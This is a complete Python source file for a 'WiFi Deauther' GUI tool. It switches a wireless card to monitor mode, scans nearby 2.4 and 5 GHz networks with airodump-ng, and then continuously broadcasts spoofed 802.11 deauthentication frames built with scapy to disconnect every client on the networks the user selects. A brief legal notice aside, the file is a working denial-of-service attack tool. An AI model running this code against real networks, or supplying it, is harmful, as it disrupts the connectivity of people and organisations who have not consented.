#!/usr/bin/env python3

import os
import csv
import subprocess
import time
from scapy.all import *
import sys
import threading
import tkinter as tk
from tkinter import ttk, messagebox, simpledialog

# Ensure the script is run with sudo
if os.geteuid() != 0:
    print("This script must be run as root. Restarting with sudo...")
    os.execvp("sudo", ["sudo"] + sys.argv)

# Global variables
deauth_running = False
scan_running = False
INTERFACE = None

# Scan duration settings
DEFAULT_SINGLE_BAND_DURATION = 10
DEFAULT_DUAL_BAND_DURATION = 10
scan_duration = DEFAULT_SINGLE_BAND_DURATION

def select_interface():
    """Create interface selection window with dropdown menu."""
    def confirm_selection():
        selected = interface_var.get()
        if not selected:
            messagebox.showerror("Error", "Please select an interface")
            return
            
        try:
            # Set monitor mode commands without killing NetworkManager
            commands = [
                f"ip link set {selected} down",
                f"iw dev {selected} set monitor control",
                f"ip link set {selected} up"
            ]
            
            # Execute commands
            for cmd in commands:
                subprocess.run(cmd.split(), check=True)
            
            # Verify monitor mode
            time.sleep(1)  # Wait for interface to stabilize
            mode = subprocess.check_output(f"iwconfig {selected} | grep Mode", 
                                        shell=True).decode()
            
            if "Monitor" in mode:
                selection_window.selected_interface = selected
                selection_window.destroy()
            else:
                raise Exception("Failed to enable monitor mode")
                
        except Exception as e:
            messagebox.showerror("Error", 
                f"Failed to set monitor mode: {str(e)}\n"
                "Please ensure your wireless card supports monitor mode.")

    # Create selection window with Kali theme
    selection_window = tk.Tk()
    selection_window.title("Select Interface")
    selection_window.geometry("800x600")  # Increased window size
    selection_window.configure(bg='#1a1a1a')
    selection_window.selected_interface = None

    # Center the window
    selection_window.update_idletasks()
    width = selection_window.winfo_width()
    height = selection_window.winfo_height()
    x = (selection_window.winfo_screenwidth() // 2) - (width // 2)
    y = (selection_window.winfo_screenheight() // 2) - (height // 2)
    selection_window.geometry(f'{width}x{height}+{x}+{y}')

    # Get wireless interfaces and sort external ones first
    interfaces = subprocess.check_output(
        "iwconfig 2>/dev/null | grep 'IEEE' | awk '{print $1}'", 
        shell=True).decode().strip().split('\n')

    if not interfaces:
        messagebox.showerror("Error", "No wireless interfaces detected!")
        selection_window.destroy()
        sys.exit(1)

    # Sort interfaces to put external ones first (typically wlan1, wlan2, etc.)
    interfaces.sort(key=lambda x: (x == 'wlan0', x))  # This puts wlan0 last

    # Create styled frame
    main_frame = tk.Frame(selection_window, bg='#1a1a1a', padx=20, pady=20)
    main_frame.pack(expand=True, fill='both')

    # Title
    tk.Label(main_frame, 
            text="WiFi Deauther",
            font=('Ubuntu', 18, 'bold'),  # Increased font size
            bg='#1a1a1a',
            fg='white').pack(pady=(0,20))

    # Important notice frame
    notice_frame = tk.Frame(main_frame, bg='#2b2b2b', padx=15, pady=15)
    notice_frame.pack(fill='x', pady=(0,20))

    notice_text = """IMPORTANT NOTICES:

1. Legal Warning:
   This tool is for educational and authorized testing purposes only.
   Using it on networks without explicit permission is illegal.

2. Hardware Requirement:
   Your wireless adapter MUST support monitor mode operation.

3. Dual-Band Notice:
   • Full scanning support for both 2.4GHz and 5GHz bands
   • Deauthentication capabilities vary by hardware
   • Some cards may only support deauthentication on specific bands
   • Test your hardware's capabilities before deployment"""

    tk.Label(notice_frame,
            text=notice_text,
            justify='left',
            bg='#2b2b2b',
            fg='#00ff00',
            font=('Ubuntu', 11)).pack()  # Increased font size

    # Interface selection frame with dropdown
    select_frame = tk.Frame(main_frame, bg='#1a1a1a')
    select_frame.pack(fill='x', pady=20)  # Increased padding

    tk.Label(select_frame,
            text="Select Wireless Interface:",
            font=('Ubuntu', 12),  # Increased font size
            bg='#1a1a1a',
            fg='white').pack(pady=(0,10))

    # Styled combobox
    style = ttk.Style()
    style.theme_use('default')
    style.configure('Custom.TCombobox', 
                   background='#2b2b2b',
                   foreground='black',
                   fieldbackground='white')

    interface_var = tk.StringVar()
    interface_combo = ttk.Combobox(select_frame,
                                 textvariable=interface_var,
                                 values=interfaces,
                                 state='readonly',
                                 font=('Ubuntu', 11),
                                 style='Custom.TCombobox')
    interface_combo.pack(pady=10)
    
    # Set first interface as default
    if interfaces:
        interface_combo.set(interfaces[0])

    # Confirm button
    tk.Button(main_frame,
              text="Enable Monitor Mode",
              command=confirm_selection,
              bg='#367bf0',
              fg='white',
              font=('Ubuntu', 12, 'bold'),
              relief='flat',
              padx=20,
              pady=10).pack(pady=20)

    selection_window.mainloop()
    
    if not selection_window.selected_interface:
        sys.exit(0)
        
    return selection_window.selected_interface

def cleanup_on_exit():
    """Restore normal mode and NetworkManager on exit."""
    if INTERFACE:
        try:
            # Restore normal mode
            subprocess.run(f"ip link set {INTERFACE} down".split())
            subprocess.run(f"iw dev {INTERFACE} set type managed".split())
            subprocess.run(f"ip link set {INTERFACE} up".split())
            
            print(f"\nSuccessfully restored network settings")
        except Exception as e:
            print(f"\nError restoring network settings: {e}")

def parse_csv_results(csv_prefix):
    """Parse the CSV results from airodump-ng."""
    try:
        csv_files = [f for f in os.listdir("/tmp") if f.startswith(csv_prefix.split("/")[-1]) and f.endswith(".csv")]
        if not csv_files:
            return []
        csv_files.sort(key=lambda x: os.path.getmtime(os.path.join("/tmp", x)), reverse=True)
        csv_file = os.path.join("/tmp", csv_files[0])
    except Exception as e:
        print(f"[!] Error finding CSV file: {str(e)}")
        return []

    networks = []
    try:
        with open(csv_file, 'r') as f:
            reader = csv.reader(f)
            for row in reader:
                if len(row) < 14 or row[0].strip() == "BSSID":
                    continue
                networks.append({
                    'bssid': row[0].strip(),
                    'channel': row[3].strip(),
                    'encryption': row[5].strip(),
                    'signal': int(row[8].strip()),
                    'essid': row[13].strip(),
                })
    except Exception as e:
        print(f"[!] Error parsing CSV: {str(e)}")
        return []

    networks.sort(key=lambda x: x['signal'], reverse=True)
    return networks

def scan_networks(band, duration):
    """Scan networks for a specific band and duration."""
    networks = []
    
    if band == "2.4":
        channel_range = "1-13"
        band_option = "bg"
        scan_single_band(channel_range, band_option, duration, networks)
    elif band == "5":
        channel_range = "36-165"
        band_option = "a"
        scan_single_band(channel_range, band_option, duration, networks)
    else:  # dual band
        # Scan 2.4GHz first
        scan_single_band("1-13", "bg", duration//2, networks)
        # Then scan 5GHz
        scan_single_band("36-165", "a", duration//2, networks)
    
    return networks

def scan_single_band(channel_range, band_option, duration, networks):
    """Helper function to scan a single band."""
    csv_prefix = f"/tmp/airodump-{band_option}"
    cmd = [
        "airodump-ng",
        "--band", band_option,
        "--channel", channel_range,
        "-w", csv_prefix,
        "--output-format", "csv",
        INTERFACE
    ]
    
    # Clean up old CSV files
    os.system(f"rm -f /tmp/airodump-{band_option}*")
    
    try:
        airodump = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(duration)
        airodump.terminate()
        airodump.wait()
        
        results = parse_csv_results(csv_prefix)
        for network in results:
            try:
                channel = int(network['channel'])
                if band_option == "bg" and 1 <= channel <= 13:
                    networks.append(network)
                elif band_option == "a" and 36 <= channel <= 165:
                    networks.append(network)
            except ValueError:
                continue
                
    except Exception as e:
        print(f"[!] Error during scanning: {e}")

def update_status(status_label, message):
    """Update the status bar with the given message."""
    status_label.config(text=f"Status: {message}")
    status_label.update_idletasks()

def stop_scan(status_label, progress_bar, tree=None):
    """Stop the scanning process and display found networks."""
    global scan_running
    if scan_running:
        scan_running = False
        messagebox.showinfo("Scan Stopped", "The scanning process has been stopped.")
        update_status(status_label, "Idle")
        progress_bar.pack_forget()
        
        # If networks were found, they will be displayed automatically
        # by the scan_networks_gui function
    else:
        messagebox.showwarning("No Scan Running", "No scanning process is currently running.")

def scan_networks_gui(band, tree, status_label, progress_bar):
    """Scan networks and display results in the GUI."""
    global scan_duration, scan_running
    
    # Set appropriate duration based on scan type
    if band == "dual":
        current_duration = DEFAULT_DUAL_BAND_DURATION
    else:
        current_duration = DEFAULT_SINGLE_BAND_DURATION
        
    tree.delete(*tree.get_children())
    update_status(status_label, f"Scanning {band}GHz networks...")
    scan_running = True

    progress_bar["value"] = 0
    progress_bar["maximum"] = current_duration
    progress_bar.pack(pady=10)

    networks = []
    try:
        airodump_thread = threading.Thread(target=lambda: networks.extend(scan_networks(band, current_duration)))
        airodump_thread.start()

        for remaining in range(current_duration, 0, -1):
            if not scan_running:
                # If scan was stopped, display networks found so far
                airodump_thread.join(timeout=1)  # Wait for thread to finish
                break
            update_status(status_label, f"Scanning {band}GHz networks... {remaining}s remaining")
            progress_bar["value"] = current_duration - remaining
            progress_bar.update()
            time.sleep(1)

        if scan_running:  # Only join if we didn't break out early
            airodump_thread.join()
    except Exception as e:
        print(f"[!] Error during scanning: {e}")
    finally:
        progress_bar.pack_forget()
        scan_running = False

    # Display networks even if scan was stopped early
    if networks:
        for idx, net in enumerate(networks, 1):
            tree.insert("", "end", values=("☐", idx, net['essid'], net['bssid'], 
                       net['channel'], net['signal'], net['encryption']))
        sort_by_signal(tree)  # Sort after inserting all networks
        update_status(status_label, "Scan stopped - Networks displayed")
    else:
        messagebox.showinfo("No Networks Found", f"No {band}GHz networks found.")
        update_status(status_label, "Idle")

def deauth_selected(tree, status_label):
    """Deauthenticate the selected networks."""
    selected_items = [item for item in tree.get_children() 
                     if tree.item(item)['values'][0] == "☑"]
    
    if not selected_items:
        messagebox.showwarning("No Selection", "Please select one or more networks to deauthenticate.")
        return

    # Get list of SSIDs for status
    ssids = [tree.item(item)['values'][2] for item in selected_items]
    status_text = "Deauthenticating: " + ", ".join(ssids)
    update_status(status_label, status_text)

    # Start deauth for each selected network
    for item in selected_items:
        values = tree.item(item)['values']
        bssid = values[3]  # BSSID is now at index 3
        channel = values[4]  # Channel is now at index 4
        threading.Thread(target=deauth_all, args=(bssid, channel, status_label, values[2])).start()

# Update deauth_all to include SSID in status
def deauth_all(bssid, channel, status_label, ssid):
    """Start deauthentication attack."""
    global deauth_running
    deauth_running = True
    os.system(f"iwconfig {INTERFACE} channel {channel}")
    packet = RadioTap() / Dot11(type=0, subtype=12, addr1="ff:ff:ff:ff:ff:ff", 
                               addr2=bssid, addr3=bssid) / Dot11Deauth()

    current_status = status_label.cget("text")
    try:
        while deauth_running:
            sendp(packet, iface=INTERFACE, count=100, inter=0.1, verbose=0)
            time.sleep(0.5)
    except Exception as e:
        print(f"[!] Error during deauth: {e}")
    finally:
        # Only update to Idle if this was the last deauth running
        if not any(thread.name.startswith('deauth_') for thread in threading.enumerate()):
            update_status(status_label, "Idle")

def stop_deauth(status_label):
    """Stop the deauthentication attack."""
    global deauth_running
    if deauth_running:
        deauth_running = False
        messagebox.showinfo("Deauth Stopped", "Deauthentication attack has been stopped.")
        update_status(status_label, "Idle")
    else:
        messagebox.showwarning("No Deauth Running", "No deauthentication attack is currently running.")

def set_scan_duration():
    """Set a custom scan duration."""
    global scan_duration
    duration = simpledialog.askinteger("Set Scan Duration", "Enter scan duration in seconds:", minvalue=1, maxvalue=60)
    if duration:
        scan_duration = duration
        messagebox.showinfo("Scan Duration Set", f"Scan duration set to {scan_duration} seconds.")

# Add this function before scan_networks_gui
def sort_by_signal(tree):
    """Sort networks by signal strength."""
    items = [(int(tree.set(item, "Signal")), item) for item in tree.get_children("")]
    items.sort(reverse=True)  # Sort by signal strength (highest first)
    for index, (signal, item) in enumerate(items):
        tree.move(item, "", index)
        tree.set(item, "Index", index + 1)  # Update index numbers

def create_gui():
    """Create the main GUI with Kali Linux theme."""
    root = tk.Tk()
    root.title("WiFi Deauther")
    root.geometry("800x600")
    root.configure(bg='#1a1a1a')
    
    # Center the main window
    root.update_idletasks()
    width = root.winfo_width()
    height = root.winfo_height()
    x = (root.winfo_screenwidth() // 2) - (width // 2)
    y = (root.winfo_screenheight() // 2) - (height // 2)
    root.geometry(f'{width}x{height}+{x}+{y}')

    # Kali-like dark theme
    style = ttk.Style()
    style.theme_use('default')
    
    # Configure style for buttons
    style.configure('Kali.TButton',
                   background='#367bf0',
                   foreground='white',
                   padding=5,
                   font=('Ubuntu', 10))
    
    # Configure style for Treeview
    style.configure("Kali.Treeview",
                   background="#2b2b2b",
                   foreground="white",
                   fieldbackground="#2b2b2b",
                   font=('Ubuntu', 10))
    
    style.configure("Kali.Treeview.Heading",
                   background="#367bf0",
                   foreground="white",
                   font=('Ubuntu', 10, 'bold'))
    
    # Control frame with dark theme
    control_frame = tk.Frame(root, bg='#1a1a1a')
    control_frame.pack(pady=10)

    # Add interface indicator
    interface_label = tk.Label(control_frame,
                             text=f"Interface: {INTERFACE}",
                             bg='#1a1a1a',
                             fg='#00ff00',
                             font=('Ubuntu', 10, 'bold'))
    interface_label.pack(side="left", padx=10)

    # Updated buttons with Kali theme
    button_configs = [
        ("Scan 2.4GHz", lambda: scan_networks_gui("2.4", tree, status_label, progress_bar)),
        ("Scan 5GHz", lambda: scan_networks_gui("5", tree, status_label, progress_bar)),
        ("Scan Both", lambda: scan_networks_gui("dual", tree, status_label, progress_bar)),
        ("Set Scan Duration", set_scan_duration),  # Changed button text
        ("Stop Deauth", lambda: stop_deauth(status_label)),
        ("Exit", lambda: os._exit(0))
    ]

    for text, command in button_configs:
        tk.Button(control_frame, 
                 text=text,
                 command=command,
                 bg='#367bf0',
                 fg='white',
                 font=('Ubuntu', 10),
                 relief='flat',
                 padx=10,
                 pady=5).pack(side="left", padx=5)

    # Updated Treeview with Kali theme
    tree = ttk.Treeview(root, 
                       columns=("Select", "Index", "ESSID", "BSSID", "Channel", "Signal", "Encryption"),
                       show="headings",
                       selectmode="none",
                       style="Kali.Treeview")
    
    # Column configurations
    tree.heading("Select", text="⬚")  # Larger checkbox column header
    tree.heading("Index", text="#")
    tree.heading("ESSID", text="Network Name")
    tree.heading("BSSID", text="BSSID")
    tree.heading("Channel", text="CH")
    tree.heading("Signal", text="Signal", command=lambda: sort_by_signal(tree))
    tree.heading("Encryption", text="Security")
    
    # Updated column widths and alignment
    tree.column("Select", width=50, anchor="center")
    tree.column("Index", width=40, anchor="center")
    tree.column("ESSID", width=200)
    tree.column("BSSID", width=150, anchor="center")
    tree.column("Channel", width=50, anchor="center")
    tree.column("Signal", width=60, anchor="center")
    tree.column("Encryption", width=100, anchor="center")
    
    # Enhanced checkbox and row selection
    def toggle_check(event):
        item = tree.identify_row(event.y)
        if item:
            current_values = tree.item(item)['values']
            if current_values:
                checked = current_values[0]
                new_check = "☑" if checked == "☐" else "☐"
                tree.set(item, "Select", new_check)
                # Highlight selected row
                if new_check == "☑":
                    tree.item(item, tags=('selected',))
                else:
                    tree.item(item, tags=())

    # Configure row colors and selection highlight
    style.configure("Kali.Treeview", rowheight=25)  # Larger rows
    tree.tag_configure('selected', background='#367bf0')
    
    tree.bind('<Button-1>', toggle_check)
    tree.pack(pady=10, fill="both", expand=True)

    # Updated deauth button
    deauth_frame = tk.Frame(root, bg='#1a1a1a')
    deauth_frame.pack(pady=5)
    
    tk.Button(deauth_frame,
             text="DEAUTHENTICATE SELECTED",
             command=lambda: deauth_selected(tree, status_label),
             bg='#ff0000',
             fg='white',
             font=('Ubuntu', 11, 'bold'),
             relief='flat',
             padx=15,
             pady=8).pack(side="left", padx=5)

    # Updated progress bar
    style.configure("Kali.Horizontal.TProgressbar",
                   background='#367bf0',
                   troughcolor='#2b2b2b')
    
    progress_bar = ttk.Progressbar(root,
                                 style="Kali.Horizontal.TProgressbar",
                                 orient="horizontal",
                                 length=400,
                                 mode="determinate")
    progress_bar.pack_forget()

    # Updated status bar
    status_label = tk.Label(root,
                         text="Status: Idle",
                         bd=1,
                         relief=tk.SUNKEN,
                         anchor="w",
                         bg='#2b2b2b',
                         fg='white',
                         font=('Ubuntu', 10))
    status_label.pack(side="bottom", fill="x")

    root.mainloop()

if __name__ == "__main__":
    try:
        INTERFACE = select_interface()
        create_gui()
    except KeyboardInterrupt:
        print(f"\nExiting...")
    finally:
        cleanup_on_exit()
        sys.exit(0)
